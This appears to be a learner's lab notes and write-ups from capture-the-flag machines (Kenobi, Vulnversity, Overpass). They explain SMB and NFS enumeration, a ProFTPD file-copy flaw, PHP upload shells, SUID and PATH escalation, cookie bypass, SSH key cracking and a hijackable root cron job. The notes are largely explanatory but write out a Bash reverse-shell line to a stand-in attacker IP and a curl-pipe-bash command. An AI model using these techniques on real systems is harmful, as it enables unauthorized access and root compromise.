I use `smbclient` when I need to browse SMB shares directly. On Kenobi, Nmap's SMB scripts did not produce a share list; `smbclient` with guest access did.

`-L` lists shares rather than opening one. When I connect to a specific share I get an `smb: \>` prompt, where commands such as `ls` and `get` act on the share. This tool is useful for interactive file access; Nmap is better suited to broad discovery.

guides.title: Netcat (nc)
guides.summary: Connect to TCP ports directly or listen for incoming reverse-shell connections.
guides.content:
Netcat was useful for two different reasons. For FTP it let me type text-based commands directly to the control port. For the PHP reverse shell it accepted the callback on port `1234`.

A TCP connection alone is not an exploit. It gives me a transport to inspect a protocol or receive an authorized lab connection.

In Overpass I learned the Bash TCP reverse-shell mechanism and the listener command on port 4444. I have not retained an actual successful callback from the root cron task.

guides.title: SearchSploit
guides.summary: Search local Exploit-DB references by software name and version.
guides.content:
After Nmap identified `ProFTPD 1.3.5`, I searched that exact product/version in SearchSploit. The returned entries included remote command-execution scripts and a **file-copy** reference.

I chose to read the file-copy entry because I already knew the path to an SSH private key. A matching title gave me a hypothesis, not confirmed exploitability.

examples.explanation: Find entries relevant to the discovered version.

examples.title: Read the file-copy entry
examples.explanation: Understand the idea before testing it.

options.when: Inspect or adapt code in an authorized lab

pitfalls: Versions can be patched or modules disabled even if SearchSploit lists an entry.

guides.title: showmount
guides.summary: Query NFS export names before mounting a shared directory.
guides.content: I ran `showmount -e` after noticing NFS and RPC ports on Kenobi. It reported an export of `/var`. That told me where I might be able to access files copied by ProFTPD.

examples.title: List exports
examples.explanation: Kenobi returned `/var`.

guides.title: mount
guides.summary: Attach an NFS export to a local directory so I can browse remote files.
guides.content:
After discovering Kenobi's `/var` export, I made a local mount point and mounted the remote directory there. `/var/tmp` on the target appeared as `/mnt/kenobi/tmp` on Kali.

Mounting is a file-access method, not the ProFTPD vulnerability itself.

examples.title: Mount the NFS export
examples.explanation: Map a remote export into my Kali filesystem.

guides.title: ssh client
guides.summary: Authenticate to a remote host with a specified account and optional private key.
guides.content:
I used a private key obtained during Kenobi rather than a password. I set the local key file's permissions to `600` and used `-i` to choose it.

## Overpass case
I learned to distinguish the local permissions warning from the key encryption prompt. The file was initially `0664`, so I used `chmod 600`; then SSH asked for the passphrase embedded in the private key's encryption. The uppercase login `James` did not work, but lowercase `james` with the recovered passphrase did.

examples.title: Connect with a key
examples.explanation: I authenticated as `kenobi`.

examples.title: Overpass key login and troubleshooting
examples.explanation: I use lowercase account name and -v only when I need verbose SSH authentication diagnostics.

guides.title: find
guides.summary: Search filesystem paths using criteria such as SUID permissions.
guides.content: When I obtained a local shell, I used `find` to look for files with the SUID bit. The useful part was not the command itself; I had to distinguish normal privileged utilities from the unusual `/usr/bin/menu` binary.

examples.title: Enumerate SUID files
examples.explanation: Hide permission errors while listing candidates.

options.meaning: Search starting at the filesystem root
Match files with user SUID set

guides.title: strings
guides.summary: Extract readable text from compiled files to find behavioral clues.
guides.content:
`strings` does not recover the original source code. In Kenobi I found `setuid`, `system`, menu labels and unqualified commands (`curl`, `uname`, `ifconfig`). Those clues made PATH hijacking worth investigating.

In Overpass I also downloaded the site's client application and inspected it with `strings`. I did not record a specific valuable string, so I treat this as reconnaissance rather than a confirmed vulnerability.

examples.title: Inspect menu strings
examples.explanation: Focus on command references that may be resolved through PATH.

guides.title: systemctl
guides.summary: Control systemd units: link, start, restart and reload definitions.
guides.content: I learned that `systemctl` is a client for systemd. In Vulnversity it was unusually root-owned and SUID, allowing me to start a custom service that wrote the result of `id` to a file. A unit configuration determines what systemd runs.

examples.title: Minimal unit definition
examples.explanation: The lab used this harmless identity test.

options.meaning: Make an external unit file known to systemd

guides.title: Executable file upload / PHP execution
guides.summary: An upload control accepted a server-executable `.phtml` file and executed it.
guides.content:
I looked at the file-upload form because it crossed the boundary between data submitted by a user and code that might run on the server. I used Intruder to check which filename extensions passed the filter.

The breakthrough was noticing that Burp sent `%2e` instead of a literal dot. After correcting the request, the upload succeeded and the server executed the PHP file. This gave me a `www-data` reverse shell.
guides.recognition: An HTTP form accepts files, especially if uploaded paths can be visited by browser.
conditions: A permitted uploaded extension must be processed as server-side code.
The uploaded file needs to be reachable or otherwise invoked.
guides.validation: I inspected the response body, corrected the raw filename and confirmed execution by receiving a `www-data` shell.
guides.impact: Remote code execution with web-service permissions.
pitfalls: HTTP 200 was not proof of success.
The first filename was sent as `shell%2ephtml`.

guides.title: SUID-root systemctl misconfiguration
guides.summary: A root-owned SUID service-control binary enabled a privileged oneshot service.
guides.content:
I found `/bin/systemctl` with `-rwsr-xr-x` and `root root` ownership. I focused on it because systemd can start processes with elevated privileges when a caller can request privileged service operations.

I wrote a minimal service whose `ExecStart` ran `id` and saved the output. The file contained `uid=0(root)`. That proved privileged command execution, not an elevated identity in my original shell.
guides.recognition: An unexpected SUID bit on root-owned `systemctl` rather than ordinary permissions.
conditions: The privileged systemctl operation must be permitted by the host configuration.
The custom unit must execute with elevated privileges.
guides.validation: A test unit created output containing `uid=0(root)`.
guides.impact: Local escalation from a low-privileged shell to root command execution.

guides.title: Anonymous SMB share disclosing configuration
guides.summary: A guest-readable share leaked paths and configuration clues useful in the wider attack.
guides.content:
Kenobi's SMB share allowed me to read `log.txt` without a password. The file contained the path to Kenobi's SSH private key, but not the key itself.

I treat this as **information exposure**, not remote code execution. The real value was how it suggested which files and services to investigate next.
guides.recognition: SMB port is open and a share can be listed or read as a guest.
conditions: Exposed files contain useful internal information.
guides.validation: I downloaded and read `log.txt` from the anonymous share.
guides.impact: Information disclosure that assisted further exploitation.

guides.title: ProFTPD 1.3.5 mod_copy file-copy flaw
guides.summary: Unauthenticated SITE CPFR / CPTO copied server-side files; the Kenobi chain used CVE-2015-3306 behavior.
guides.content:
Once Nmap identified ProFTPD 1.3.5, I searched the version in Exploit-DB via SearchSploit and chose the **File Copy** entry. That mattered because I already knew `/home/kenobi/.ssh/id_rsa` existed.

I checked `SITE HELP`, then tested source and destination operations. Copying did not transfer the file to Kali; I placed it under the NFS-exported directory so a second service could provide access.
guides.recognition: ProFTPD 1.3.5 reported on FTP port 21; public references identified a `mod_copy` weakness.
conditions: Affected copying commands are available and accessible to unauthenticated clients.
FTP service has read access to source and write access to destination.
A way to read the destination is needed to retrieve the file.
guides.validation: I saw the `SITE` commands, tested the copy operations and retrieved the moved key through NFS.
guides.impact: Unauthorized server-side file copying that exposed an SSH private key.

guides.title: NFS export exposing /var
guides.summary: An accessible `/var` export created a retrieval path for a file copied by FTP.
guides.content: `showmount -e` revealed that Kenobi exported `/var`. I mounted that export on Kali. This alone was not remote code execution; in combination with `mod_copy`, it gave me access to a file that FTP placed in `/var/tmp`.
guides.recognition: NFS is open and an exported directory is accessible to my lab client.
conditions: The export is mountable by the client.
Permissions allow reading the target file.
guides.validation: I mounted `/var` and retrieved the copy of the SSH private key.
guides.impact: Cross-service file exposure through an accessible NFS export.

guides.title: SUID PATH hijacking in /usr/bin/menu
guides.summary: A SUID helper referenced external commands without absolute paths.
guides.content:
I found the custom SUID `/usr/bin/menu` and used `strings` to inspect it. The output included `setuid`, `system`, `curl -I localhost`, `uname -r` and `ifconfig`.

Because the command names were not absolute paths, I investigated how `PATH` determines which executable is run. I practiced placing a replacement command ahead of the real `curl`, but my final privileged-shell identity was not captured. I should not treat a `strings` match alone as proof that privileges are preserved.
guides.recognition: Unexpected root-owned SUID executable calls `system()` with unqualified command names.
conditions: Program resolves commands from an attacker-influenced PATH.
The process retains the necessary elevated identity.
guides.validation: I inspected the SUID and command strings and worked through the PATH replacement technique with guidance; final root result not posted.
guides.impact: Potential local privilege escalation through unintended executable selection.

guides.title: TCP SYN scanning and port states
guides.summary: SYN/ACK, RST and filtering explain how Nmap decides whether ports are open.
guides.content:
In a SYN scan I send a SYN without completing a normal connection. A SYN/ACK generally indicates an open port, an RST generally indicates a closed port, and missing or filtering-related responses may lead to `filtered`.

I learned that `-sS` is not invisible: firewalls and monitoring systems can still detect probes. `-sV` follows up with protocol probes when I need software identification.

examples.title: SYN discovery
examples.explanation: Scan port states without completing normal connections.

guides.title: Linux ownership, SUID and directory permissions
guides.summary: File and directory modes control access; SUID changes effective identity for privileged executables.
guides.content:
`-rwsr-xr-x` on a root-owned binary shows SUID in the owner's execute position. A program may run with root's effective UID while the caller is an unprivileged user. I also learned that file-read permission is not enough if a parent directory such as `/root` denies traversal.

I do not assume that any SUID executable is automatically exploitable; program behavior and authorization matter.

In Overpass, `-rw-rw-rw-` on `/etc/hosts` meant mode `666`: any local user could alter hostname mappings even though the file owner was root. I learned to check the permission bits independently of ownership. This becomes serious when a root process trusts the affected hostname for code retrieval.

examples.explanation: List candidates for manual investigation.

examples.title: Inspect a mode
examples.explanation: Check SUID bit and owner.

examples.title: Check the hosts file's real permissions
examples.code:
ls -l /etc/hosts
test -w /etc/hosts && echo Writable || echo Not-writable
examples.explanation: The mode and the writability test help establish if my shell can influence hostname resolution.

guides.title: Shell PATH, redirection and script building
guides.summary: Build command lines by understanding variables, search order and output redirection.
guides.content:
I can explain `export PATH=/home/kenobi/tools/:$PATH`: I put a directory before the old search path, and `$PATH` preserves the existing entries. The shell searches command directories from left to right.

I practiced `>` to save output, `2>&1` to include errors, `chmod +x` to permit script execution, and heredocs to write a small file. I still need to build longer shell commands independently.

## Overpass Bash reverse-shell redirection
I studied `bash -i >& /dev/tcp/<KALI_VPN_IP>/4444 0>&1`. `bash -i` starts an interactive shell. In Bash, `/dev/tcp/HOST/PORT` in a redirection opens a TCP connection. `>&` redirects stdout and stderr to the connection; `0>&1` redirects stdin to the current stdout destination. File descriptors `0`, `1` and `2` are stdin, stdout and stderr. The network connection doesn't grant root: the Bash process inherits the identity of its parent. In Overpass the intended parent was a root cron task.

I also learned that `curl URL | bash` passes downloaded script bytes directly to a shell. This is dangerous when run privileged against content whose destination or contents an unprivileged account can influence.

guides.title: How I look for attack points
guides.summary: Move from observation to vulnerability hypothesis, then validate prerequisites and chain useful access.
guides.content:
## The questions I ask
1. **What is exposed?** Scan ports, discover forms, enumerate shares and identify actual service versions.
2. **What is unusual?** Anonymous access, an executable upload, a sensitive path, a suspicious SUID binary or a service with a known issue.
3. **Can I research it?** Check the specific software/version in SearchSploit or an authoritative advisory. A matching title is only a lead.
4. **What proof would settle it?** Look for an actual server response, a file copy, a working shell or an observed identity change.
5. **How can I combine findings?** In Kenobi, SMB disclosed a key path, FTP copied the key and NFS let me retrieve it.

I want to make these decisions myself rather than following a preselected attack chain.

## Overpass: evidence-driven decisions
I scanned all TCP ports, then chose HTTP because it had pages and JavaScript I could examine before having credentials. Rather than guessing passwords, I inspected client-side authentication and tested whether a random cookie opened the admin page. This found a weakness without an exploit database entry.

After recovering an encrypted SSH key and logging in, I proposed SUID, capabilities or cron as possible escalation routes, then followed cron. A scheduled root `curl | bash` command was only a vulnerability hypothesis until I found `/etc/hosts` was writable. I then asked whether I could serve the exact file and verified the target could download it. I still need to verify whether the cron job actually executed the remote code as root.

The recurring question I now want to ask is **what privileged operation consumes an input I can control?** I want to keep evidence, tests and unproven assumptions separate.

guides.summary: Enumerate web paths with a wordlist to discover hidden routes.
guides.content: I used Gobuster during Overpass HTTP reconnaissance and found `/admin`. A discovered route is a lead: I still need to inspect its functionality and how it enforces authentication.

guides.title: John the Ripper / ssh2john.py

guides.content: I found an encrypted SSH private key in Overpass. I used `ssh2john.py` to convert its encryption metadata into input John accepts, then tested a common wordlist with John. A match was recovered and I used that passphrase to unlock the SSH key. I do not record the actual passphrase. The attack was offline against a local key, not repeated SSH password attempts.

guides.content: I noticed the Overpass root cron line used `curl overpass.thm/downloads/src/buildscript.sh | bash`. I then tested whether the target could fetch a Kali-hosted script directly. A successful HTTP response does not prove the scheduled job executed it.

guides.title: Cron / scheduled task execution
guides.summary: Cron executes commands on a schedule; execution identity and command inputs determine security impact.
guides.content:
I inspected `/etc/crontab` after logging in to Overpass as `james`. The system-wide crontab specified both the schedule and the execution user. One task ran every minute as root and fetched `http://overpass.thm/downloads/src/buildscript.sh` through curl before piping the result to Bash. I recognized this as an attack point only after learning that `/etc/hosts` was world writable, allowing an unprivileged user to redirect the hostname.

I confirmed the target could fetch a Kali-hosted test script but did not preserve a root callback. I distinguish controllable code input, privileged execution and final proof of impact.

techniques.title: Root cron fetch of attacker-controllable script
techniques.why: Running remote script bytes as root trusts the source and hostname resolution.
techniques.approach: I read /etc/crontab, used getent hosts and ls -l /etc/hosts, then served a matching HTTP path and tested reachability. Root execution is not yet verified in my notes.

guides.title: Client-controlled cookie authentication bypass
guides.summary: An arbitrary cookie granted access to the Overpass admin area without normal login.
guides.content: I discovered `/admin` via Gobuster, inspected the JavaScript used by the login page and saw it set a cookie on success. I then manually set a cookie with a random value and reloaded the protected page. It opened. I inferred the server wasn't adequately validating authenticated state. The issue was not password weakness; it was placing trust in a client-controlled value.
guides.recognition: Protected page redirects to login but login JavaScript writes a client-controlled cookie; arbitrary cookie state changes route access.
guides.conditions: The application must rely on an insufficiently validated client-controlled authentication marker.
guides.validation: I created an arbitrary cookie, reloaded /admin and observed protected content.
guides.impact: Unauthorized admin-page access, including exposure of an SSH key.

guides.title: Exposed encrypted SSH key with weak passphrase
guides.summary: The Overpass admin page exposed a usable private key whose passphrase matched a common wordlist.
guides.content: After accessing the admin page, I found an SSH private key for `james`. SSH initially rejected local file permissions; after `chmod 600`, it requested the key passphrase. I used `ssh2john.py` and John with rockyou.txt to recover a matching passphrase, then authenticated to the SSH account. I do not publish the recovered passphrase or private key.
guides.recognition: A private key appears in a web-reachable resource; SSH indicates the key is encrypted.
guides.conditions: Private key material is available and its passphrase is weak enough to recover; matching public key is authorized for the target account.
guides.validation: I recovered one passphrase match in John and confirmed an SSH login as james.
guides.impact: Remote account access through exposed private-key material.

guides.title: World-writable hosts file + privileged cron curl|bash
guides.summary: World-writable hostname mapping could redirect a root cron task that executes downloaded HTTP script content.
guides.content: I found a minutely root cron task that used `curl overpass.thm/downloads/src/buildscript.sh | bash`. `getent hosts overpass.thm` returned `127.0.0.1`; `ls -l /etc/hosts` returned `-rw-rw-rw-` owned by root. I could therefore edit the target's hostname mapping despite being `james`. I set up a matching web path on Kali and verified the target could download its test script. I studied the root reverse-shell redirection. I have not provided final root execution proof.
guides.recognition: System-wide crontab runs a network-fetched script under root, while the hostname mapping used to reach that script is writable by unprivileged users.
guides.conditions: Target must resolve the hostname through a user-editable mapping, reach the substitute HTTP host, and execute fetched content through privileged Bash.
guides.validation: I confirmed the root crontab text, 127.0.0.1 name resolution, /etc/hosts mode 666 and successful retrieval of a Kali-served file. Cron execution remains unverified.
guides.impact: Potential arbitrary root code execution by redirecting a trusted update-script fetch; final impact unconfirmed.
